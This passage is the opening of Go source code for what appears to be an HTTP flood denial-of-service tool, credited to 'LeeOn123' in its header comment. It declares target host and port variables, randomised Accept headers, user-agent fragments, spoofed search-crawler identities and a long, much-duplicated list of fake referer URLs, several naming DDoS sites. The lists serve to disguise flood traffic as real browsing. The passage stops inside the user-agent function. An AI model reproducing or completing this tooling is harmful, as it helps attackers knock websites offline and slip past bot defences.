/*
Coded by LeeOn123
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
                "https://www.mozilla.org/en-US/firefox/136.0.4/releasenotes/",
                "https://cloudflare.com/",
                "https://challenges.cloudflare.com/cdn-cgi/challenge-platform/h/g/turnstile/if/ov2/av0/rcv/dvq91/0x4AAAAAAACHgJOf9yBKf4B8/auto/fbE/auto_expire/normal/auto/",
                "https://captcha.request123.xyz/?__cf_chl_tk=FfHpmlpM4i4EZ4rflLFtMgD2WqkoR5pCXfcXro4KcdI-1713811530-0.0.1.1-1322", 
                "http://anonymouse.org/cgi-bin/anon-www.cgi/", 
                "https://cfcybernews.eu/?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514", 
                "http://coccoc.com/search#query=", 
                "http://ddosvn.somee.com/f5.php?v=", 
                "http://engadget.search.aol.com/search?q=", 
                "http://eu.battle.net/wow/en/search?q=", 
                "http://filehippo.com/search?q=", 
                "http://funnymama.com/search?q=", 
                "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", 
                "http://help.baidu.com/searchResult?keywords=", 
                "http://host-tracker.com/check_page/?furl=", 
                "http://itch.io/search?q=", 
                "http://jigsaw.w3.org/css-validator/validator?uri=", 
                "http://jobs.bloomberg.com/search?q=", 
                "http://jobs.leidos.com/search?q=", 
                "http://jobs.rbs.com/jobs/search?q=", 
                "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", 
                "http://louis-ddosvn.rhcloud.com/f5.html?v=", 
                "http://millercenter.org/search?q=", 
                "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", 
                "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=", 
                "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", 
                "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", 
                "http://search.aol.com/aol/search?q=", 
                "http://taginfo.openstreetmap.org/search?q=", 
                "http://techtv.mit.edu/search?q=", 
                "http://validator.w3.org/feed/check.cgi?url=", 
                "http://vk.com/profile.php?redirect=",
                "http://www.ask.com/web?q=", 
                "http://www.baoxaydung.com.vn/news/vn/search&q=", 
                "http://www.bestbuytheater.com/events/search?q=", 
                "http://www.bing.com/search?q=", 
                "http://www.evidence.nhs.uk/search?q=", 
                "http://www.google.com/?q=", 
                "http://www.google.com/translate?u=", 
                "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", 
                "http://www.pagescoring.com/website-speed-test/?url=",
                "http://www.reddit.com/search?q=", 
                "http://www.search.com/search?q=", 
                "http://www.shodanhq.com/search?q=", 
                "http://www.ted.com/search?q=", 
                "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", 
                "http://www.usatoday.com/search/results?q=", 
                "http://www.ustream.tv/search?q=", 
                "http://yandex.ru/yandsearch?text=", 
                "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", 
                "https://add.my.yahoo.com/rss?url=", 
                "https://careers.carolinashealthcare.org/search?q=", 
                "https://check-host.net/", 
                "https://developers.google.com/speed/pagespeed/insights/?url=", 
                "https://drive.google.com/viewerng/viewer?url=", 
                "https://duckduckgo.com/?q=", 
                "https://google.com/", 
                "https://play.google.com/store/search?q=", 
                "https://pornhub.com/", 
                "https://r.search.yahoo.com/", 
                "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", 
                "https://steamcommunity.com/market/search?q=", 
                "https://vk.com/profile.php?redirect=", 
                "https://www.bing.com/search?q=", 
                "https://www.cia.gov/index.html", 
                "https://www.facebook.com/", 
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
                "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
                "https://www.fbi.com/", 
                "https://www.globe.com.ph/#gref",
                "https://www.globe.com.ph/",
                "https://www.google.ad/search?q=", 
                "https://www.google.ae/search?q=", 
                "https://www.abs-cbn.com",
                "https://www.gmanetwork.com",
                "https://www.deped.gov.ph",
                "https://www.google.al/search?q=", 
                "https://www.google.co.ao/search?q=", 
                "https://www.google.com.af/search?q=", 
                "https://www.google.com.ag/search?q=", 
                "https://www.google.com.ai/search?q=", 
                "https://www.google.com/search?q=", 
                "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", 
                "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=", 
                "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=", 
                "https://www.npmjs.com/search?q=", 
                "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", 
                "https://www.pinterest.com/search/?q=", 
                "https://www.qwant.com/search?q=", 
                "https://www.ted.com/search?q=", 
                "https://www.usatoday.com/search/results?q=", 
                "https://www.yandex.com/yandsearch?text=", 
                "https://www.youtube.com/",
                "https://www.google.com/",
                "http://www.baoxaydung.com.vn/news/vn/search&q=",
                "https://check-host.net/?lang=en",
                "https://www.fbi.com/",
                "https://www.bing.com/search?q=",
                "https://www.instagram.com/",
                "https://www.facebook.com/",
                "https://www.bostonglobe.com",
                "https://www.twitter.com/",
                "https://www.youtube.com/",
                "https://www.linkedin.com/",
                "https://xnxx.com/",
                "https://xvideos.com/",
                "https://www.bing.com/search?q=",
                "https://r.search.yahoo.com/",
                "https://psai.ph",
                "https://www.cia.gov/index.html",
                "https://vk.com/profile.php?redirect=",
                "https://www.usatoday.com/search/results?q=",
                "https://help.baidu.com/searchResult?keywords=",
                "https://steamcommunity.com/market/search?q=",
                "https://www.ted.com/search?q=",
                "https://play.google.com/store/search?q=",
                "https://www.qwant.com/search?q=",
                "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
                "https://www.google.ad/search?q=",
                "https://www.google.ae/search?q=",
                "https://www.google.com.af/search?q=",
                "https://www.google.com.ag/search?q=",
                "https://www.google.com.ai/search?q=",
                "https://www.google.al/search?q=",
                "https://www.google.am/search?q=",
                "https://www.google.co.ao/search?q=",
                "http://anonymouse.org/cgi-bin/anon-www.cgi/",
                "http://coccoc.com/search#query=",
                "http://ddosvn.somee.com/f5.php?v=",
                "http://engadget.search.aol.com/search?q=",
                "http://engadget.search.aol.com/search?q=query?=query=&q=",
                "http://eu.battle.net/wow/en/search?q=",
                "http://filehippo.com/search?q=",
                "http://funnymama.com/search?q=",
                "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
                "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
                "http://go.mail.ru/search?mail.ru=1&q=",
                "http://help.baidu.com/searchResult?keywords=",
                "http://host-tracker.com/check_page/?furl=",
                "http://itch.io/search?q=",
                "http://jigsaw.w3.org/css-validator/validator?uri=",
                "http://jobs.bloomberg.com/search?q=",
                "http://jobs.leidos.com/search?q=",
                "http://jobs.rbs.com/jobs/search?q=",
                "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
                "http://louis-ddosvn.rhcloud.com/f5.html?v=",
                "http://millercenter.org/search?q=",
                "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
                "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
                "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
                "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
                "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
                "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
                "http://funnymama.com/search?q=", 
                "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
                "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
                "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
                "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
                "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
                "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
                "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
                "http://search.aol.com/aol/search?q=",
                "http://taginfo.openstreetmap.org/search?q=",
                "http://techtv.mit.edu/search?q=",
                "https://myfuturejob.ph",
                "https://www.deped.gov.ph",
                "http://validator.w3.org/feed/check.cgi?url=",
                "http://jigsaw.w3.org/css-validator/validator?uri=",
                "https://captcha.request123.xyz/?__cf_chl_tk=FfHpmlpM4i4EZ4rflLFtMgD2WqkoR5pCXfcXro4KcdI-1713811530-0.0.1.1-1322", 
                "https://cfcybernews.eu/?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514",
                "http://vk.com/profile.php?redirect=",
                "http://ddosvn.somee.com/f5.php?v=",
                "http://www.ask.com/web?q=",
                "http://www.baoxaydung.com.vn/news/vn/search&q=",
                "http://www.bestbuytheater.com/events/search?q=",
                "http://www.bing.com/search?q=",
                "http://www.evidence.nhs.uk/search?q=",
                "http://www.google.com/?q=",
                "http://www.google.com/translate?u=",
                "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
                "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
                "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
                "http://www.pagescoring.com/website-speed-test/?url=",
                "http://www.reddit.com/search?q=",
                "http://www.search.com/search?q=",
                "http://www.shodanhq.com/search?q=",
                "http://www.ted.com/search?q=",
                "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
                "http://www.usatoday.com/search/results?q=",
                "http://www.ustream.tv/search?q=",
                "http://yandex.ru/yandsearch?text=",
                "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
                "http://ytmnd.com/search?q=",
                "https://add.my.yahoo.com/rss?url=",
                "https://careers.carolinashealthcare.org/search?q=",
                "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
                "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
                "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
                "https://www.npmjs.com/search?q=",
                "https://check-host.net/",
                "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", 
                "https://www.pinterest.com/search/?q=", 
                "https://www.qwant.com/search?q=", 
                "https://www.ted.com/search?q=", 
                "https://www.usatoday.com/search/results?q=", 
                "https://www.yandex.com/yandsearch?text=",
                "https://developers.google.com/speed/pagespeed/insights/?url=",
                "https://drive.google.com/viewerng/viewer?url=",
                "https://duckduckgo.com/?q=",
                "https://google.com/",
                "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
                "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
                "https://help.baidu.com/searchResult?keywords=",
                "https://play.google.com/store/search?q=",
                "https://r.search.yahoo.com/",
                "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
                "https://steamcommunity.com/market/search?q=",
                "https://vk.com/profile.php?redirect=",
                "https://www.bing.com/search?q=",
                "https://www.cia.gov/index.html",
                "https://www.tiktok.com",
                "https://www.facebook.com/",
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
                "https://www.fbi.com/",
                "https://www.google.ad/search?q=",
                "https://www.google.ae/search?q=",
                "https://www.google.al/search?q=",
                "https://www.google.co.ao/search?q=",
                "https://www.google.com.af/search?q=",
                "https://www.google.com.ag/search?q=",
                "https://www.google.com.ai/search?q=",
                "https://www.google.com/search?q=",
                "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
                "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
                "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
                "https://www.npmjs.com/search?q=",
                "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
                "https://www.pinterest.com/search/?q=",
                "https://www.qwant.com/search?q=",
                "https://www.ted.com/search?q=",
                "https://www.usatoday.com/search/results?q=",
                "https://www.yandex.com/yandsearch?text=",
                "https://www.youtube.com/",
                "https://yandex.ru/",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
